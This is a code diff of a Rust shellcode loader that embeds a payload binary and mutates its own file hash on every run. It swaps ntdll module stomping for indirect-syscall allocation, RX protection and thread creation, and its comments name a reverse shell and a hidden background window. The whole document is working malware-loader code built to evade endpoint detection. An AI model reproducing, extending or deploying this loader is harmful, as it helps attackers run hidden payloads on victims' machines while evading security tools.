@@ -1,11 +1,17 @@
+// #![windows_subsystem = "windows"] // enable it for background
 mod logger;
-use dinvoke_rs::overload;
-use dinvoke_rs::dmanager::Manager;
 use hexspell::pe::PE;
 use std::fs;
 use getrandom::fill;
 use std::env::current_exe;
 use std::str::from_utf8;
+use busywork::*;
+use windows::Win32::Foundation::HANDLE;
+use windows::Wdk::Foundation::OBJECT_ATTRIBUTES;
+use dinvoke_rs::data::{
+    NtAllocateVirtualMemory, NtProtectVirtualMemory, NtCreateThreadEx,
+    PVOID, PsAttributeList,
+};
 
 #[used]
 #[unsafe(link_section = ".counter")]
@@ -15,6 +21,7 @@ static SHELLCODE: &[u8] = include_bytes!("../shellcode.bin");
 fn fill_random(buf: &mut [u8]) -> Result<(), String> {
     fill(buf).map_err(|e| format!("getrandom: {}", e))
 }
+
 
 // Fill `.counter` with fresh random bytes and swap the binary in place.
 // The point is the file hash, not the value: every run rewrites 8 bytes,
@@ -70,53 +77,142 @@ fn bump_counter() -> Result<(), String> {
     Ok(())
 }
 
+
 fn execute_shellcode() -> Result<(), String> {
-    // for more information on how that technique works use the crate docs
-    // http://crates.io/crates/dinvoke_rs/0.2.2
     unsafe {
-        // Copy the compile-time embedded shellcode into a heap Vec.
         let shellcode_vec = SHELLCODE.to_vec();
+        let shellcode_size = shellcode_vec.len();
 
-        // Load a legitimate, signed DLL to use as the stomping ground.
-        // `ntdll.dll` is chosen because it is always mapped into every process
-        // and has many sizable functions — good candidates to overwrite.
-        // Loading by name also avoids a static import entry in our IAT.
-        let my_dll = dinvoke_rs::dinvoke::load_library_a("ntdll.dll");
-          if my_dll == 0 {
-            return Err("cant find the provided dll".to_string());
+        // NT constants
+        const MEM_COMMIT: u32 = 0x1000;
+        const MEM_RESERVE: u32 = 0x2000;
+        const PAGE_READWRITE: u32 = 0x04;
+        const PAGE_EXECUTE_READ: u32 = 0x20;
+        const THREAD_ALL_ACCESS: u32 = 0x1FFFFF;
+        const INFINITE: u32 = 0xFFFFFFFF;
+
+        // Current process pseudo-handle
+        let process_handle: HANDLE = HANDLE { 0: -1isize as _ };
+
+        // ------------------------------------------------------------------
+        // 1. NtAllocateVirtualMemory (indirect syscall)
+        // ------------------------------------------------------------------
+        let mut base_address: PVOID = std::ptr::null_mut();
+        let mut region_size: usize = shellcode_size;
+
+        let function_type_alloc: NtAllocateVirtualMemory;
+        let mut ret_alloc: Option<i32>;
+
+        dinvoke_rs::dinvoke::execute_syscall!(
+            "NtAllocateVirtualMemory",
+            function_type_alloc,
+            ret_alloc,
+            process_handle,
+            &mut base_address,
+            0usize,
+            &mut region_size,
+            MEM_COMMIT | MEM_RESERVE,
+            PAGE_READWRITE
+        );
+
+        if ret_alloc.unwrap_or(-1) != 0 || base_address.is_null() {
+            return Err(format!(
+                "NtAllocateVirtualMemory failed: 0x{:X}",
+                ret_alloc.unwrap_or(-1) as u32
+            ));
         }
-        // Overwrite a function inside the loaded DLL with our shellcode.
-        // Arguments:
-        //   &shellcode_vec — the payload bytes to write
-        //   0              — let DInvoke pick the target function automatically
-        //                    (it iterates the DLL's exception data looking for
-        //                    a function large enough to hold the shellcode)
-        //   my_dll         — the module base address to stomp into
-        // Returns (original_bytes, stomp_address):
-        //   original_bytes — the DLL code that was overwritten (used by dmanager
-        //                    to restore the DLL to its clean state)
-        //   stomp_address  — the address where the shellcode now lives
-        let module = overload::managed_module_stomping(&shellcode_vec, 0, my_dll).map_err(|e| format!("error while tring to excute the shellcode {:?}", e))?;
 
-        let original_bytes = module.0;
-        let stomp_address = module.1;
-        // 1. Create the manager and register the stomped shellcode
-        let mut manager = Manager::new();
-        // The manager takes ownership of the shellcode bytes and the original DLL bytes.
-        // The return value is a Result, so we need to handle it.
-        let _ = manager.new_shellcode(stomp_address, shellcode_vec, original_bytes);
-        // 2. Hide the shellcode immediately after stomping.
-        //    This restores the DLL's original code, so memory scanners see the clean DLL.
-        let _ = manager.hide_shellcode(stomp_address);
-        // 3. When you actually want to run the shellcode, restomp it first.
-        let _ = manager.stomp_shellcode(stomp_address);
-        // 4. Execute it.
-        let func: unsafe extern "system" fn() = std::mem::transmute(stomp_address);
-        func();
-        // 5. Hide it again after execution (if the shellcode returns).
-        //    If the shellcode exits the process (like a reverse shell), this line won't be reached.
-        let _ = manager.hide_shellcode(stomp_address);
-            
+        // ------------------------------------------------------------------
+        // 2. Copy shellcode into the allocated memory
+        // ------------------------------------------------------------------
+        std::ptr::copy_nonoverlapping(
+            shellcode_vec.as_ptr(),
+            base_address as *mut u8,
+            shellcode_size,
+        );
+
+        // ------------------------------------------------------------------
+        // 3. NtProtectVirtualMemory (indirect syscall) — flip to RX
+        // ------------------------------------------------------------------
+        let mut protect_base: PVOID = base_address;
+        let mut protect_size: usize = shellcode_size;
+        let mut old_protect: u32 = 0;
+
+        let function_type_protect: NtProtectVirtualMemory;
+        let mut ret_protect: Option<i32>;
+
+        dinvoke_rs::dinvoke::execute_syscall!(
+            "NtProtectVirtualMemory",
+            function_type_protect,
+            ret_protect,
+            process_handle,
+            &mut protect_base,
+            &mut protect_size,
+            PAGE_EXECUTE_READ,
+            &mut old_protect
+        );
+
+        if ret_protect.unwrap_or(-1) != 0 {
+            return Err(format!(
+                "NtProtectVirtualMemory failed: 0x{:X}",
+                ret_protect.unwrap_or(-1) as u32
+            ));
+        }
+
+        // ------------------------------------------------------------------
+        // 4. NtCreateThreadEx (indirect syscall) — execute the shellcode
+        // ------------------------------------------------------------------
+        let mut thread_handle: HANDLE = HANDLE::default();
+        let attributes: *mut OBJECT_ATTRIBUTES = std::ptr::null_mut();
+        let buffer: *mut PsAttributeList = std::ptr::null_mut();
+
+        let function_type_thread: NtCreateThreadEx;
+        let mut ret_thread: Option<i32>;
+
+        dinvoke_rs::dinvoke::execute_syscall!(
+            "NtCreateThreadEx",
+            function_type_thread,
+            ret_thread,
+            &mut thread_handle,          // *mut HANDLE
+            THREAD_ALL_ACCESS,           // ACCESS_MASK
+            attributes,                  // *mut OBJECT_ATTRIBUTES
+            process_handle,              // HANDLE
+            base_address,                // PVOID (StartRoutine)
+            std::ptr::null_mut(),        // PVOID (Argument)
+            0u32,                        // CreateFlags
+            0usize,                      // ZeroBits
+            0usize,                      // StackSize
+            0usize,                      // MaximumStackSize
+            buffer                       // *mut PsAttributeList
+        );
+
+        if ret_thread.unwrap_or(-1) != 0 || thread_handle.0 == std::ptr::null_mut() {
+            return Err(format!(
+                "NtCreateThreadEx failed: 0x{:X}",
+                ret_thread.unwrap_or(-1) as u32
+            ));
+        }
+
+        // ------------------------------------------------------------------
+        // 5. Keep the process alive for the shellcode's lifetime.
+        //    Waits until the shellcode thread exits (session end, crash,
+        //    or explicit ExitThread). No fixed timeout — the reverse shell
+        //    stays connected as long as it needs to.
+        // ------------------------------------------------------------------
+        let kernel32 = dinvoke_rs::dinvoke::get_module_base_address("kernel32.dll");
+        if kernel32 == 0 {
+            return Err("kernel32 not found".to_string());
+        }
+
+        let wait_for_single_object: unsafe extern "system" fn(
+            HANDLE, // hHandle
+            u32,    // dwMilliseconds
+        ) -> u32 = std::mem::transmute(
+            dinvoke_rs::dinvoke::get_function_address(kernel32, "WaitForSingleObject"),
+        );
+
+        wait_for_single_object(thread_handle, INFINITE);
+
         Ok(())
     }
 }
